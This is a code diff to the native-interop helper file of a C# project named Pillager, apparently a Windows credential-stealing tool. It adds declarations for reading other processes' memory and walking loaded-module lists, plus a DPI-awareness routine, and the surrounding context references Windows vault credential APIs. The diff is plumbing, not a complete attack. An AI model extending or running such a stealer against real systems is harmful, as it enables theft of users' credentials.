@@ -1,12 +1,141 @@
-﻿using System;
+﻿using Microsoft.Win32;
+using System;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using static Pillager.Helper.Native;
 
 namespace Pillager.Helper
 {
     public static class Native
     {
+        [DllImport("ntdll.dll")]
+        public static extern int NtWow64QueryInformationProcess64(int hProcess, uint ProcessInfoclass, out PROCESS_BASIC_INFORMATION64 pBuffer, uint nSize, out uint nReturnSize);
+
+        [DllImport("ntdll.dll")]
+        public unsafe static extern int NtWow64ReadVirtualMemory64(int hProcess, ulong pMemAddress, int* pBufferPtr, ulong nSize, out ulong nReturnSize);
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtWow64ReadVirtualMemory64(int hProcess, ulong pMemAddress, out LDR_DATA_TABLE_ENTRY64 pBufferPtr, ulong nSize, out ulong nReturnSize);
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtWow64ReadVirtualMemory64(int hProcess, ulong pMemAddress, out ulong pBufferPtr, ulong nSize, out ulong nReturnSize);
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtWow64ReadVirtualMemory64(int hProcess, ulong pMemAddress, out LIST_ENTRY64 pBufferPtr, ulong nSize, out ulong nReturnSize);
+
+        public struct LIST_ENTRY64
+        {
+            public ulong Flink;
+
+            public ulong Blink;
+        }
+
+        public struct LDR_DATA_TABLE_ENTRY64
+        {
+            public LIST_ENTRY64 InLoadOrderLinks;
+
+            public LIST_ENTRY64 InMemoryOrderLinks;
+
+            public LIST_ENTRY64 InInitializationOrderLinks;
+
+            public ulong DllBase;
+
+            public ulong EntryPoint;
+
+            public uint SizeOfImage;
+
+            public UNICODE_STRING64 FullDllName;
+
+            public UNICODE_STRING64 BaseDllName;
+
+            public uint Flags;
+
+            public ushort LoadCount;
+
+            public ushort TlsIndex;
+
+            public LIST_ENTRY64 HashLinks;
+
+            public uint CheckSum;
+
+            public ulong LoadedImports;
+
+            public ulong EntryPointActivationContext;
+
+            public ulong PatchInformation;
+        }
+
+        public struct PROCESS_BASIC_INFORMATION64
+        {
+            public uint NTSTATUS;
+
+            public uint Reserved0;
+
+            public ulong PebBaseAddress;
+
+            public ulong AffinityMask;
+
+            public uint BasePriority;
+
+            public uint Reserved1;
+
+            public ulong UniqueProcessId;
+
+            public ulong InheritedFromUniqueProcessId;
+        }
+
+        public struct UNICODE_STRING64
+        {
+            public ushort Length;
+
+            public ushort MaximumLength;
+
+            public ulong Buffer;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MEMORY_BASIC_INFORMATION64
+        {
+            public IntPtr BaseAddress;
+            public IntPtr AllocationBase;
+            public uint AllocationProtect;
+            public uint __alignment1;
+            public ulong RegionSize;
+            public uint State;
+            public uint Protect;
+            public uint Type;
+            public uint __alignment2;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct MEMORY_BASIC_INFORMATION32
+        {
+            public UInt32 BaseAddress;
+            public UInt32 AllocationBase;
+            public UInt32 AllocationProtect;
+            public UInt32 RegionSize;
+            public UInt32 State;
+            public UInt32 Protect;
+            public UInt32 Type;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        internal static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int nSize, out int lpNumberOfBytesRead);
+
+        [DllImport("ntdll.dll")]
+        public static extern int NtWow64ReadVirtualMemory64(IntPtr hProcess, ulong pMemAddress, [Out] byte[] pBufferPtr, ulong nSize, out ulong nReturnSize);
+
+        [DllImport("kernel32.dll", EntryPoint = "VirtualQueryEx")]
+        internal static extern int VirtualQueryEx64(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION64 lpBuffer, uint dwLength);
+
+
+        [DllImport("kernel32.dll", EntryPoint = "VirtualQueryEx")]
+        public static extern Int32 VirtualQueryEx32(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION32 lpBuffer, UInt32 dwLength);
+        [DllImport("kernel32")]
+        public static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll", EntryPoint = "GetFirmwareEnvironmentVariableW", SetLastError = true, CharSet = CharSet.Unicode, ExactSpelling = true, CallingConvention = CallingConvention.StdCall)]
+        public static extern int GetFirmwareType(string lpName, string lpGUID, IntPtr pBuffer, uint size);
         [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         public static extern bool RevertToSelf();
         [DllImport("advapi32.dll", SetLastError = true)]
@@ -21,8 +150,6 @@ namespace Pillager.Helper
         public static extern bool IsWow64Process(IntPtr hProcess, out bool wow64Process);
         [DllImport("shell32.dll")]
         public static extern int SHGetFolderPath(IntPtr hwndOwner, int nFolder, IntPtr hToken, uint dwFlags, [Out] StringBuilder pszPath);
-        [DllImport("user32.dll", SetLastError = true)]
-        public static extern bool SetProcessDPIAware();
         [DllImport("ntdll", SetLastError = true)]
         public static extern uint NtSuspendProcess([In] IntPtr Handle);
         [DllImport("ntdll.dll", SetLastError = false)]
@@ -132,6 +259,8 @@ namespace Pillager.Helper
         [DllImport("ntdll.dll")]
         public static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int returnLength);
 
+        [DllImport("kernel32.dll")]
+        public static extern int OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
 
         [DllImport("kernel32.dll", SetLastError = true)]
         public static extern IntPtr OpenProcess(PROCESS_ACCESS_FLAGS dwDesiredAccess, bool bInheritHandle, int dwProcessId);
@@ -152,9 +281,6 @@ namespace Pillager.Helper
         [DllImport("kernel32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
-
-        [DllImport("kernel32.dll")]
-        public static extern IntPtr GetCurrentProcess();
 
         public const uint STATUS_SUCCESS = 0;
         public const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
@@ -562,6 +688,61 @@ namespace Pillager.Helper
         [DllImport("vaultcli.dll", EntryPoint = "VaultGetItem")]
         public static extern int VaultGetItem_WIN7(IntPtr vaultHandle, ref Guid schemaId, IntPtr pResourceElement, IntPtr pIdentityElement, IntPtr zero, int arg5, ref IntPtr passwordVaultPtr);
 
+        #endregion
+
+        #region DPI
+        private enum PROCESS_DPI_AWARENESS
+        {
+            Process_DPI_Unaware = 0,
+            Process_System_DPI_Aware = 1,
+            Process_Per_Monitor_DPI_Aware = 2
+        }
+        private enum DPI_AWARENESS_CONTEXT
+        {
+            DPI_AWARENESS_CONTEXT_UNAWARE = 16,
+            DPI_AWARENESS_CONTEXT_SYSTEM_AWARE = 17,
+            DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE = 18,
+            DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2 = 34
+        }
+        [DllImport("user32.dll", SetLastError = true)]
+        private static extern bool SetProcessDpiAwarenessContext(int dpiFlag);
+
+        [DllImport("SHCore.dll", SetLastError = true)]
+        private static extern bool SetProcessDpiAwareness(PROCESS_DPI_AWARENESS awareness);
+
+        [DllImport("user32.dll")]
+        private static extern bool SetProcessDPIAware();
+
+        public static void SetupDpiAwareness()
+        {
+            try
+            {
+                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion"))
+                {
+                    int majorVersion = (int)key.GetValue("CurrentMajorVersionNumber");
+                    int minorVersion = (int)key.GetValue("CurrentMinorVersionNumber");
+                    int buildNumber = int.Parse(key.GetValue("CurrentBuildNumber").ToString());
+
+                    Version version = new Version(majorVersion, minorVersion, buildNumber);
+                    if (version >= new Version(6, 3, 0)) // Windows 8.1
+                    {
+                        if (version >= new Version(10, 0, 15063)) // Windows 10 1703
+                        {
+                            SetProcessDpiAwarenessContext((int)DPI_AWARENESS_CONTEXT.DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);
+                        }
+                        else
+                        {
+                            SetProcessDpiAwareness(PROCESS_DPI_AWARENESS.Process_Per_Monitor_DPI_Aware);
+                        }
+                    }
+                    else
+                    {
+                        SetProcessDPIAware();
+                    }
+                }
+            }
+            catch { }
+        }
         #endregion
     }
 }
